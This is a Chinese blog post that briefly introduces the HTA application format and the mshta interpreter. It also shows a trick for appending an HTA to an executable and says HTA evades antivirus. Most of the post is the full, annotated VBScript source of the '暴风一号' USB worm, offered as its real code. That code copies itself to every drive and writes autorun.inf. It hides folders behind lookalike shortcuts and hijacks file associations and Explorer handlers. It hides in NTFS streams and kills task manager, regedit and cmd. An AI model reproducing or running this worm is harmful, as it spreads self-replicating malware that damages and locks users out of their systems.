---
title: MS-HTA格式
top: false
date: 2019-05-07 22:02:43
tags: HTA病毒
categories: 旧物新篇
---
HTA是Html Application的简写，也就是“基于html技术编写的应用程序”。它是Microsot在很久以前推出一门技术。作为一门技术，它已经很老了（和如今日新月异的前端技术比起来）。
<!-- more -->

查阅网上资料发现，HTA早在99年就已经被提出了，和我差不多大……

# 入门教学

下面是一个简单的实例，将它保存为xx.hta的形式，然后双击运行就可以看到效果。

**语法参考html，如同在编写网页！**

```html
<HTML>
<HEAD>
<HTA:APPLICATION ID="HelloExample" 
   BORDER="thick" 
   BORDERSTYLE="complex"/>
<TITLE>HTA - Hello World</TITLE>
</HEAD>
<BODY>
<H2>HTA - Hello World</H2>
</BODY>
</HTML>
```

HTA支持html和vbscript、jscript（参考javascript），语法却更加随意。有人用HTA做了个简单的俄罗斯砖块，代码很少，不到500行。
[点我下载](/uploads/eluosi.hta)用HTA做的俄罗斯砖块小游戏。

当执行常规html文件时，执行仅限于web浏览器的安全模型，也就是说它仅限于与服务器通信，操纵页面的对象模型（通常用于验证表单或创建视觉效果）和读或写cookie。
而hta作为**完全受信任的应用程序**运行，因此具有比普通html文件更多的权限。例如hta可以**创建、编辑和删除文件和注册表项**。虽然hta在此“可信”环境中运行，但查询Active Directory可能会受到Internet Explorer区域逻辑和相关错误消息的影响。

# mshta命令（Winxp、8、10）

**Windows里用来运行HTA应用的解释器。**

```cmd
mshta %要执行文件的绝对路径%
```

**HTA是解释运行的，类似于某些脚本语言。**也就是说，只要HTA的那一部分没有破坏，我可以随心所欲的在源文件中添加我想要添加的东西——
**添加任何二进制数据，甚至在原始HTA文件添加一个完整的exe文件。**

```
copy /b %windir%\system32\calc.exe+a.hta a1.exe
```

这样制作成的exe文件，双击可以正常打开计算器。但是在命令行下调用mshta解释器会解释运行其中的HTA文档。

![](/uploads/hta_hack.jpg)


# 暴风一号（病毒）

HTA格式相比于普通html文件具有如下特点：
- 都基于html动态脚本语言编写
- HTA系统访问不受限制（不存在sandbox保护）
- HTA可以方便的绕过AV程序，它们的行为不像普通html那样被严格控制

暴风一号，原名Worm.Script.VBS.Autorun.be。这是一个由VBS脚本编写、采用加密和自变形手段，通过U盘传播的恶意蠕虫病毒。病毒行为包括：**自变形**、**自复制**、**该注册表**、**遍历文件夹**、**关闭弹出光驱**、**锁定计算机**、**进程异常**等。
这是一个VBS病毒，可惜**Microsoft已经彻底放弃把VBS作为前端语言了**。现在VBS主要用来做些自动化，写点病毒什么的。

下面是“暴风一号”的真正源码。

```html
On Error Resume Next '//屏蔽出错信息，发生错误时继续向下执行
Dim Fso,WshShell '//定义了两个变量

'//创建并返回对 Automation 对象的引用。
'//CreateObject(servername.typename [, location])
'//servername 必选项。提供对象的应用程序名称。
'//typename 必选项。要创建的对象类型或类。
'//location 可选项。对象所在的网络服务器将被创建。
'//说明Automation 服务器至少提供一种对象类型。例如，字处理应用程序可以提供应用程序对象、文档对象和工具条对象。

Set Fso=CreateObject("scRiPTinG.fiLEsysTeMoBjEcT") '//为变量Fso赋值 创建 Scripting.FileSystemObject 对象 提供对计算机文件系统的访问
Set WshShell=CreateObject("wScRipT.SHelL") '//为变量WshShell赋值 创建Wscript.Shell对象 用于获取系统环境变量的访问、创建快捷方式、访问Windows的特殊文件夹，
                       '//以及添加或删除注册表条目。还可以使用Shell对象的功能创建更多的定制对话框以进行用户交互。
Call Main() '//call 将控制权传递到sub或function
Sub Main() '//sub、function 两种表示方法 sub没有返回值，function有返回值
    On Error Resume Next
    Dim Args, VirusLoad, VirusAss
    Set Args=WScript.Arguments '//返回wsh对象的参数集
    VirusLoad=GetMainVirus(1)  '//获得System文件夹下smss.exe 蠕虫地址
    VirusAss=GetMainVirus(0)   '//获得Windows文件夹下explorer.exe 蠕虫地址
    ArgNum=0
   
    Do While ArgNum < Args.Count
        Param=Param&" "&Args(ArgNum)
        ArgNum=ArgNum + 1
    Loop
    SubParam=LCase(Right(Param, 3)) '//LCase 返回字符串的小写形式 Right 从字符串右边返回指定数目的字符
   
    Select Case SubParam '//select类似switch
    Case "run" '//当运行run时，同时启动病毒文件
        RunPath=Left(WScript.ScriptFullName, 2) '//ScriptFullName属性返回当前正在运行的脚本的完整路径。该属性返回一个只读的字符串。
        Call Run(RunPath)
        Call InvadeSystem(VirusLoad,VirusAss)
        Call Run("%SystemRoot%/system/svchost.exe "&VirusLoad)
       
    Case "txt", "log","ini" ,"inf" '//运行"txt", "log", "ini", "inf"后缀名文件时，同时启动病毒文件
        RunPath="%SystemRoot%/system32/NOTEPAD.EXE "&Param
        Call Run(RunPath)
        Call InvadeSystem(VirusLoad,VirusAss)
        Call Run("%SystemRoot%/system/svchost.exe "&VirusLoad)
       
    Case "bat", "cmd" '//运行"bat", "cmd"批处理或命令提示符时，同时启动病毒文件
        RunPath="CMD /c echo Hi!I'm here!&pause"
        Call Run(RunPath)
        Call InvadeSystem(VirusLoad,VirusAss)
        Call Run("%SystemRoot%/system/svchost.exe "&VirusLoad)
       
    Case "reg" '//运行"reg"注册表导入程序时，同时启动病毒文件
        RunPath="regedit.exe "&""""&Trim(Param)&""""
        Call Run(RunPath)
        Call InvadeSystem(VirusLoad,VirusAss)
        Call Run("%SystemRoot%/system/svchost.exe "&VirusLoad)
       
    Case "chm" '//运行"chm"帮助文件时，同时启动病毒文件
        RunPath="hh.exe "&""""&Trim(Param)&""""
        Call Run(RunPath)
        Call InvadeSystem(VirusLoad,VirusAss)
        Call Run("%SystemRoot%/system/svchost.exe "&VirusLoad)

    Case "hlp" '//运行"hlp"帮助文件时，同时启动病毒文件
        RunPath="winhlp32.exe "&""""&Trim(Param)&""""
        Call Run(RunPath)
        Call InvadeSystem(VirusLoad,VirusAss)
        Call Run("%SystemRoot%/system/svchost.exe "&VirusLoad)
       
    Case "dir" '//运行dir命令，同时启动病毒文件
        RunPath=""""&Left(Trim(Param),Len(Trim(Param))-3)&""""
        Call Run(RunPath)
        Call InvadeSystem(VirusLoad,VirusAss)
        Call Run("%SystemRoot%/system/svchost.exe "&VirusLoad)

    Case "oie" '//打开我IE图标，同时启动病毒文件
        RunPath="""%ProgramFiles%/Internet Explorer/IEXPLORE.EXE"""
        Call Run(RunPath)
        Call InvadeSystem(VirusLoad,VirusAss)
        Call Run("%SystemRoot%/system/svchost.exe "&VirusLoad)

    Case "omc" '//打开我的电脑图标，同时启动病毒文件
        RunPath="explorer.exe /n,::{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
        Call Run(RunPath)
        Call InvadeSystem(VirusLoad,VirusAss)
        Call Run("%SystemRoot%/system/svchost.exe "&VirusLoad)
       
    Case "emc" '//劫持Win+E
        RunPath="explorer.exe /n,/e,::{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
        Call Run(RunPath)
        Call InvadeSystem(VirusLoad,VirusAss)
        Call Run("%SystemRoot%/system/svchost.exe "&VirusLoad)

    Case Else
        If PreDblInstance=True Then '//如果条件满足，退出脚本宿主
            WScript.Quit
        End If
        Timeout = Datediff("ww", GetInfectedDate, Date) - 12
        If Timeout>0 And Month(Date) = Day(Date) Then
               Call VirusAlert()
               Call MakeJoke(CInt(Month(Date)))
        End If
        Call MonitorSystem()
       
    End Select
End Sub

'//监视系统 结束taskmgr.exe、regedit.exe、msconfig.exe、cmd.exe
Sub MonitorSystem()
    On Error Resume Next
    Dim ProcessNames, ExeFullNames
    ProcessNames=Array("cmd.exe","cmd.com","regedit.exe","regedit.scr","regedit.pif","regedit.com","msconfig.exe")
    VBSFullNames=Array(GetMainVirus(1)) '//变量赋值
    Do
        Call KillProcess(ProcessNames) '//如发现变量中的进程，调用结束进程函数
        Call InvadeSystem(GetMainVirus(1),GetMainVirus(0)) '// smss.exe 蠕虫地址 explorer.exe 蠕虫地址
        Call KeepProcess(VBSFullNames) '//保持病毒进程
        WScript.Sleep 3000 '//脚本宿主等待时间为3000毫秒=3秒
    Loop
End Sub

'//侵入系统
Sub InvadeSystem(VirusLoadPath,VirusAssPath)
    On Error Resume Next
    Dim Load_Value, File_Value, IE_Value, MyCpt_Value1, MyCpt_Value2, HCULoad, HCUVer, VirusCode, Version
    Load_Value=""""&VirusLoadPath&"""" '//smss.exe的病毒流
    File_Value="%SystemRoot%/System32/WScript.exe "&""""&VirusAssPath&""""&" %1 %* " '// explorer.exe 蠕虫
    IE_Value="%SystemRoot%/System32/WScript.exe "&""""&VirusAssPath&""""&" OIE " '// 打开ie 蠕虫
    MyCpt_Value1="%SystemRoot%/System32/WScript.exe "&""""&VirusAssPath&""""&" OMC " '//打开我的电脑 蠕虫
    MyCpt_Value2="%SystemRoot%/System32/WScript.exe "&""""&VirusAssPath&""""&" EMC " '//劫持Win+E 蠕虫
    HCULoad="HKEY_CURRENT_USER/SoftWare/Microsoft/Windows NT/CurrentVersion/Windows/Load"
    HCUVer="HKEY_CURRENT_USER/SoftWare/Microsoft/Windows NT/CurrentVersion/Windows/Ver"
    HCUDate="HKEY_CURRENT_USER/SoftWare/Microsoft/Windows NT/CurrentVersion/Windows/Date"
    VirusCode=GetCode(WScript.ScriptFullName)
    Version=1
    HostSourcePath=Fso.GetSpecialFolder(1)&"/Wscript.exe"
    HostFilePath=Fso.GetSpecialFolder(0)&"/system/svchost.exe"
   
    For Each Drive In Fso.Drives '//分别建立各个目录的病毒名字
        If Drive.IsReady and (Drive.DriveType=1 Or Drive.DriveType=2 Or Drive.DriveType=3) Then
            DiskVirusName=GetSerialNumber(Drive.DriveLetter)&".vbs"
                Call CreateAutoRun(Drive.DriveLetter,DiskVirusName) '//创建自动运行
                Call InfectRoot(Drive.DriveLetter,DiskVirusName) '//感染
        End If
    Next
   
    If FSO.FileExists(VirusAssPath)=False Or FSO.FileExists(VirusLoadPath)=False Or FSO.FileExists(HostFilePath)=False Or GetVersion()< Version Then
        If GetFileSystemType(GetSystemDrive())="NTFS" Then '//判断是否为NTFS分区
            Call CreateFile(VirusCode,VirusAssPath)
            Call CreateFile(VirusCode,VirusLoadPath) '//这一步创建了流文件
            Call CopyFile(HostSourcePath,HostFilePath) '//这一步将wscript.exe从system32复制到system目录并改名svchost.exe
            Call SetHiddenAttr(HostFilePath)
        Else '//FAT32格式
            Call CreateFile(VirusCode, VirusAssPath)
            Call SetHiddenAttr(VirusAssPath)
            Call CreateFile(VirusCode,VirusLoadPath)
            Call SetHiddenAttr(VirusLoadPath)
            Call CopyFile(HostSourcePath, HostFilePath)
            Call SetHiddenAttr(HostFilePath)
        End If
    End If
   
    If ReadReg(HCULoad)<>Load_Value  Then  '//改写注册表启动项，smss.exe的流
        Call WriteReg (HCULoad, Load_Value, "")
    End If
   
    If GetVersion() < Version Then   '//改写版本信息为1
        Call WriteReg (HCUVer, Version, "")
    End If
   
    If GetInfectedDate() = "" Then
        Call WriteReg (HCUDate, Date, "")  '//记录感染时间
    End If

    '//以下更改许多文件关联,病毒的通用感染方式
    If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/txtfile/shell/open/command/")<>File_Value Then
        Call SetTxtFileAss(VirusAssPath)
    End If
   
    If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/inifile/shell/open/command/")<>File_Value Then
        Call SetIniFileAss(VirusAssPath)
    End If
   
    If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/inffile/shell/open/command/")<>File_Value Then
        Call SetInfFileAss(VirusAssPath)
    End If
   
    If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/batfile/shell/open/command/")<>File_Value Then
        Call SetBatFileAss(VirusAssPath)
    End If
   
    If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/cmdfile/shell/open/command/")<>File_Value Then
        Call SetCmdFileAss(VirusAssPath)
    End If

    If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/regfile/shell/open/command/")<>File_Value Then
        Call SetRegFileAss(VirusAssPath)
    End If
   
    If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/chm.file/shell/open/command/")<>File_Value Then
        Call SetchmFileAss(VirusAssPath)
    End If
   
    If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/hlpfile/shell/open/command/")<>File_Value Then
        Call SethlpFileAss(VirusAssPath)
    End If
   
    If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/Applications/iexplore.exe/shell/open/command/")<>IE_Value Then
        Call SetIEAss(VirusAssPath)
    End If
   
    If ReadReg("HKEY_CLASSES_ROOT/CLSID/{871C5380-42A0-1069-A2EA-08002B30309D}/shell/OpenHomePage/Command/")<>IE_Value Then
        Call SetIEAss(VirusAssPath)
    End If
   
    If ReadReg("HKEY_CLASSES_ROOT/CLSID/{20D04FE0-3AEA-1069-A2D8-08002B30309D}/shell/open/command/")<>MyCpt_Value1 Then
        Call SetMyComputerAss(VirusAssPath)
    End If
   
    If ReadReg("HKEY_CLASSES_ROOT/CLSID/{20D04FE0-3AEA-1069-A2D8-08002B30309D}/shell/explore/command/")<>MyCpt_Value2 Then
        Call SetMyComputerAss(VirusAssPath)
    End If
   
    Call RegSet()
End Sub

'//拷贝文件
Sub CopyFile(source, pathf)
    On Error Resume Next
    If FSO.FileExists(pathf) Then
        FSO.DeleteFile pathf , True
    End If   
    FSO.CopyFile source, pathf
End Sub

'//创建文件
Sub CreateFile(code, pathf)
    On Error Resume Next
    Dim FileText
    If FSO.FileExists(pathf) Then
        Set FileText=FSO.OpenTextFile(pathf, 2, False)
        FileText.Write code
        FileText.Close
    Else
        Set FileText=FSO.OpenTextFile(pathf, 2, True)
        FileText.Write code
        FileText.Close
    End If
End Sub

'//注册表设置
Sub RegSet()
    On Error Resume Next
    Dim RegPath1 , RegPath2, RegPath3, RegPath4
    RegPath1="HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Explorer/Advanced/Folder/Hidden/NOHIDDEN/CheckedValue"
    RegPath2="HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Explorer/Advanced/Folder/Hidden/SHOWALL/CheckedValue"
    RegPath3="HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/Policies/Explorer/NoDriveTypeAutoRun"
    RegPath4="HKEY_CLASSES_ROOT/lnkfile/IsShortcut"
    Call WriteReg (RegPath1, 3, "REG_DWORD")
    Call WriteReg (RegPath2, 2, "REG_DWORD")
    Call WriteReg (RegPath3, 0, "REG_DWORD")
    Call DeleteReg (RegPath4)
End Sub

'//结束进程
Sub KillProcess(ProcessNames)
    On Error Resume Next
    Set WMIService=GetObject("winmgmts://./root/cimv2")
    For Each ProcessName in ProcessNames
        Set ProcessList=WMIService.execquery(" Select * From win32_process where name ='"&ProcessName&"' ")
        For Each Process in ProcessList
            IntReturn=Process.terminate
            If intReturn<>0 Then
                WshShell.Run "CMD /c ntsd -c q -p "&Process.Handle, vbHide, False
            End If
        Next
    Next
End Sub

'//删掉autorun.inf免疫目录
Sub KillImmunity(D)
    On Error Resume Next
    ImmunityFolder=D&":/Autorun.inf"
    If Fso.FolderExists(ImmunityFolder) Then
        WshSHell.Run ("CMD /C CACLS "& """"&ImmunityFolder&"""" &" /t /e /c /g everyone:f"),vbHide,True   '//提权
        WshSHell.Run ("CMD /C RD /S /Q "& ImmunityFolder), vbHide, True   '//rd命令删除，配合 /s /q 选项，很轻松
    End If
End Sub

'//保护病毒进程 保持脚本进程持续运行，少于2个创建新进程
Sub KeepProcess(VBSFullNames)
    On Error Resume Next
    For Each VBSFullName in VBSFullNames
        If VBSProcessCount(VBSFullName) < 2 then
            Run("%SystemRoot%/system/svchost.exe "&VBSFullName)
        End If
    Next
End Sub

'//获得系统分区 c:
'//FileSystemObject.GetSpecialFolder 返回指定特殊文件夹
'//WindowsFolder   0   Windows 文件夹，包含 Windows 操作系统安装的文件。
'//SystemFolder    1   System 文件夹，包含库、字体和设备驱动程序文件。
'//TemporaryFolder 2   Temp 文件夹，用于保存临时文件。可以在 TMP 环境变量中找到该文件夹的路径。
'//Left 返回指定数目的从字符串的左边算起的字符。
Function GetSystemDrive()
    GetSystemDrive=Left(Fso.GetSpecialFolder(0),2)
End Function

'//FileSystemObject.GetDrive返回与指定的路径中驱动器相对应的 Drive 对象。Drive 提供对磁盘驱动器或网络共享的属性的访问。
'//Drive.FileSystem返回指定的驱动器使用的文件系统的类型。
Function GetFileSystemType(Drive)
    Set d=FSO.GetDrive(Drive)
    GetFileSystemType=d.FileSystem
End Function

'//读取注册表建值 返回所在路径
Function ReadReg(strkey)
    Dim tmps
    Set tmps=CreateObject("WScript.Shell")
    ReadReg=tmps.RegRead(strkey)
    Set tmps=Nothing
End Function

'//重写注册表键值
Sub WriteReg(strkey, Value, vtype)
    Dim tmps
    Set tmps=CreateObject("WScript.Shell")
    If vtype="" Then
        tmps.RegWrite strkey, Value
    Else
        tmps.RegWrite strkey, Value, vtype
    End If
    Set tmps=Nothing
End Sub

'//删除注册表键值
Sub DeleteReg(strkey)
    Dim tmps
    Set tmps=CreateObject("WScript.Shell")
    tmps.RegDelete strkey
    Set tmps=Nothing
End Sub

'//设置隐藏属性
Sub SetHiddenAttr(path)
    On Error Resume Next
    Dim vf
    Set vf=FSO.GetFile(path)
    Set vf=FSO.GetFolder(path)
    vf.Attributes=6 '// 6=2+4 分别是隐藏、系统属性
End Sub

'//执行ExeFullName指定的文件
Sub Run(ExeFullName)
    On Error Resume Next
    Dim WshShell
    Set WshShell=WScript.CreateObject("WScript.Shell")
    WshShell.Run ExeFullName
    Set WshShell=Nothing
End Sub

'//感染根目录
Sub InfectRoot(D,VirusName)
    On Error Resume Next
    Dim VBSCode
    VBSCode=GetCode(WScript.ScriptFullName)
    VBSPath=D&":/"&VirusName
    If FSO.FileExists(VBSPath)=False Then
        Call CreateFile(VBSCode, VBSPath)
        Call SetHiddenAttr(VBSPath)
    End If
    Set Folder=Fso.GetFolder(D&":/")  '//隐藏根目录下的所有子目录
    Set SubFolders=Folder.Subfolders
    For Each SubFolder In SubFolders
        SetHiddenAttr(SubFolder.Path)
        LnkPath=D&":/"&SubFolder.Name&".lnk"  '//创建对应的快捷方式
        TargetPath=D&":/"&VirusName
        Args=""""&D&":/"&SubFolder.Name& "/Dir"""
        If Fso.FileExists(LnkPath)=False Or GetTargetPath(LnkPath) <> TargetPath Then
            If Fso.FileExists(LnkPath)=True Then
                FSO.DeleteFile LnkPath, True
            End If
            Call CreateShortcut(LnkPath,TargetPath,Args)
        End If
    Next
End Sub

'//上一步失败了调用这个函数创建快捷方式
Sub CreateShortcut(LnkPath,TargetPath,Args)
    Set Shortcut=WshShell.CreateShortcut(LnkPath)
    with Shortcut
        .TargetPath=TargetPath
        .Arguments=Args
        .WindowStyle=4
        .IconLocation="%SystemRoot%/System32/Shell32.dll, 3"
        .Save
    end with
End Sub

'//创建autorun.inf文件
Sub CreateAutoRun(D,VirusName)
    On Error Resume Next
    Dim InfPath, VBSPath, VBSCode
    InfPath=D&":/AutoRun.inf"
    VBSPath=D&":/"&VirusName
    VBSCode=GetCode(WScript.ScriptFullName)
    If FSO.FileExists(InfPath)=False Or FSO.FileExists(VBSPath)=False Then
        Call CreateFile(VBSCode, VBSPath)
        Call SetHiddenAttr(VBSPath)
        StrInf="[AutoRun]"&VBCRLF&"Shellexecute=WScript.exe "&VirusName&" ""AutoRun"""&VBCRLF&"shell/open=打开(&O)"&VBCRLF&"shell/open/command=WScript.exe "&VirusName&"

""AutoRun"""&VBCRLF&"shell/open/Default=1"& VBCRLF&"shell/explore=资源管理器(&X)"&VBCRLF&"shell/explore/command=WScript.exe "&VirusName&" ""AutoRun"""
        Call KillImmunity(D)
        Call CreateFile(StrInf, InfPath)
        Call SetHiddenAttr(InfPath)
    End If
End Sub

'//改变txt格式文件关联
Sub SetTxtFileAss(sFilePath)
    On Error Resume Next
    Dim Value
    Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" %1 %* "
    Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/txtfile/shell/open/command/", Value, "REG_EXPAND_SZ")
End Sub

'//改变ini格式文件关联
Sub SetIniFileAss(sFilePath)
    On Error Resume Next
    Dim Value
    Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" %1 %* "
    Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/inifile/shell/open/command/", Value, "REG_EXPAND_SZ")
End Sub

'//改变inf格式文件关联
Sub SetInfFileAss(sFilePath)
    On Error Resume Next
    Dim Value
    Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" %1 %* "
    Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/inffile/shell/open/command/", Value, "REG_EXPAND_SZ")
End Sub

'//改变bat格式文件关联
Sub SetBatFileAss(sFilePath)
    On Error Resume Next
    Dim Value
    Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" %1 %* "
    Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/batfile/shell/open/command/", Value, "REG_EXPAND_SZ")
End Sub

'//改变cmd格式文件关联
Sub SetCmdFileAss(sFilePath)
    On Error Resume Next
    Dim Value
    Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" %1 %* "
    Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/cmdfile/shell/open/command/", Value, "REG_EXPAND_SZ")
End Sub

'//改变hlp格式文件关联
Sub SethlpFileAss(sFilePath)
    On Error Resume Next
    Dim Value
    Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" %1 %* "
    Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/hlpfile/shell/open/command/", Value, "REG_EXPAND_SZ")
End Sub

'//改变reg格式文件关联
Sub SetRegFileAss(sFilePath)
    On Error Resume Next
    Dim Value
    Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" %1 %* "
    Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/regfile/shell/open/command/", Value, "REG_EXPAND_SZ")
End Sub

'//改变chm格式文件关联
Sub SetchmFileAss(sFilePath)
    On Error Resume Next
    Dim Value
    Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" %1 %* "
    Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/chm.file/shell/open/command/", Value, "REG_EXPAND_SZ")
End Sub

'//篡改IE启动设置
Sub SetIEAss(sFilePath)
    On Error Resume Next
    Dim Value
    Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" OIE "
    Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/Applications/iexplore.exe/shell/open/command/", Value, "REG_EXPAND_SZ")
    Call WriteReg("HKEY_CLASSES_ROOT/CLSID/{871C5380-42A0-1069-A2EA-08002B30309D}/shell/OpenHomePage/Command/", Value, "REG_EXPAND_SZ")
End Sub

'//改变我的电脑的打开关联，包括Win+E
Sub SetMyComputerAss(sFilePath)
    On Error Resume Next
    Dim Value1,Value2
    Value1="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" OMC "
    Value2="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" EMC "
    Call WriteReg("HKEY_CLASSES_ROOT/CLSID/{20D04FE0-3AEA-1069-A2D8-08002B30309D}/shell/", "", "REG_SZ")
    Call WriteReg("HKEY_CLASSES_ROOT/CLSID/{20D04FE0-3AEA-1069-A2D8-08002B30309D}/shell/open/command/", Value1, "REG_EXPAND_SZ")
    Call WriteReg("HKEY_CLASSES_ROOT/CLSID/{20D04FE0-3AEA-1069-A2D8-08002B30309D}/shell/explore/command/", Value2, "REG_EXPAND_SZ")
End Sub

'//获得系统驱动盘符名 Drive.SerialNumber 盘符序列号 c-->驱动器 C: - 固定<BR>序列号：-1598325125、d-->驱动器 D: - 固定<BR>序列号：237835280、e、f。
Function GetSerialNumber(Drv)
    On Error Resume Next
    Set d=fso.GetDrive(Drv)
    GetSerialNumber=d.SerialNumber '// 返回十进制序列号，用于唯一标识一个磁盘卷。Select Case d.DriveType     Case 0: t = "未知"    Case 1: t = "可移动"    Case 2: t = "固定"
                           '// Case 3: t = "网络"    Case 4: t = "CD-ROM"    Case 5: t = "RAM 磁盘"      End Select
    GetSerialNumber=Replace(GetSerialNumber,"-","")
End Function

'//获得蠕虫病毒路径   &表示字符串相加  GetSpecialFolder 返回指定的特殊文件夹
Function GetMainVirus(N)
    On Error Resume Next
    MainVirusName=GetSerialNumber(GetSystemDrive())&".vbs"
    If GetFileSystemType(GetSystemDrive())="NTFS" Then
        If N=1 Then '//System 文件夹，包含库、字体和设备驱动程序文件。 SystemFolder
              GetMainVirus=Fso.GetSpecialFolder(N)&"/smss.exe:"&MainVirusName '//返回 如c:/windows/system32/smss.exe:72161642.vbs
        End If
        If N=0 Then '//Windows 文件夹，包含 Windows 操作系统安装的文件。 WindowsFolder
              GetMainVirus=Fso.GetSpecialFolder(N)&"/explorer.exe:"&MainVirusName '//返回 如c:/windows/explorer.exe:72161642.vbs
        End If
    Else
          GetMainVirus=Fso.GetSpecialFolder(N)&"/"&MainVirusName
    End If
End Function

'//返回指定路径vbs脚本的运行个数
Function VBSProcessCount(VBSPath)
    On Error Resume Next
    Dim WMIService, ProcessList, Process
    VBSProcessCount=0
    Set WMIService=GetObject("winmgmts://./root/cimv2")
    Set ProcessList=WMIService.ExecQuery("Select * from Win32_Process Where "&"Name='cscript.exe' or Name='wscript.exe' or Name='svchost.exe'")
    For Each Process in ProcessList
        If InStr(Process.CommandLine, VBSPath)>0 Then
            VBSProcessCount=VBSProcessCount+1
        End If
    Next
End Function

'//'用来计数wscript进程的个数，如果大于等于3个那么返回True
Function PreDblInstance()
    On Error Resume Next
    PreDblInstance=False
    If VBSProcessCount(WScript.ScriptFullName)>= 3 Then
        PreDblInstance=True
    End If
End Function

'//获取快捷方式的vbs脚本地址
Function GetTargetPath(LnkPath)
    On Error Resume Next
    Dim Shortcut
    Set Shortcut=WshShell.CreateShortcut(LnkPath)
    GetTargetPath=Shortcut.TargetPath
End Function

'//读取文件 返回 TextStream
Function GetCode(FullPath)
    On Error Resume Next
    Dim FileText
    Set FileText=FSO.OpenTextFile(FullPath, 1) '//打开指定的文件并返回一个 TextStream 对象，可以读取、写入此对象或将其追加到文件。 
                           '// 1 以只读模式打开文件。不能对此文件进行写操作。
    GetCode=FileText.ReadAll '//读入全部 TextStream 文件并返回结果字符串
    FileText.Close
End Function

'//获得注册表 版本键值 获取windows版本
Function GetVersion()
    Dim VerInfo
    VerInfo="HKEY_CURRENT_USER/SoftWare/Microsoft/Windows NT/CurrentVersion/Windows/Ver"
    If ReadReg(VerInfo)="" Then
        GetVersion=0
    Else
        GetVersion=CInt(ReadReg(VerInfo)) '//CInt 返回表达式，此表达式已被转换为 Integer 子类型的 Variant。
    End If
End Function

'//网页文件BFAlert.hta
Sub VirusAlert()
    On Error Resume Next
    Dim HtaPath,HtaCode
    HtaPath=Fso.GetSpecialFolder(1)&"/BFAlert.hta"
    HtaCode="<HTML><HEAD><TITLE>暴风一号</TITLE>"&VBCRLF&"<HTA:APPLICATION APPLICATIONNAME=""BoyFine V1.0"" SCROLL=""no"" windowstate=""maximize""

border=""none"""&VBCRLF&"SINGLEINSTANCE=""yes"" CAPTION=""no"" contextMenu=""no"" ShowInTaskBar=""no"" selection=""no"">"&VBCRLF&"</HEAD><BODY bgcolor=#000000><DIV align

=""center"">"&VBCRLF&"<font style=""font-size:3500%;font-family:Wingdings;color=red"">N</font><BR>"&VBCRLF&"<font style=""font-size:200%;font-family:黑体;color=red"">暴风一号

</font>"&VBCRLF&"</DIV></BODY></HTML>"
    If FSO.FileExists(HtaPath)=False Then
        Call CreateFile(HtaCode, HtaPath) '//创建网页文件BFAlert.hta
        Call SetHiddenAttr(HtaPath) '//设置隐藏
    End If
    Call Run(HtaPath)
End Sub

'//获得感染注册表时间键
Function GetInfectedDate()
    On Error Resume Next
    Dim DateInfo
    DateInfo="HKEY_CURRENT_USER/SoftWare/Microsoft/Windows NT/CurrentVersion/Windows/Date"
    If ReadReg(DateInfo)="" Then
        GetInfectedDate=""
    Else
        GetInfectedDate=CDate(ReadReg(DateInfo))
    End If
End Function

'//弹出光驱
Sub MakeJoke(Times)
    On Error Resume Next
    Dim WMP, colCDROMs
    Set WMP = CreateObject( "WMPlayer.OCX" ) '//创建WMPlayer.OCX插件对象
    Set colCDROMs = WMP.cdromCollection '//系统中光驱
    If colCDROMs.Count >0 Then
        For i=1 to Times
            colCDROMs.Item(0).eject() '//退出抽取式设备
            WScript.Sleep 3000
            colCDROMs.Item(0).eject()
        Next
    End If
    Set WMP = Nothing
End Sub
```
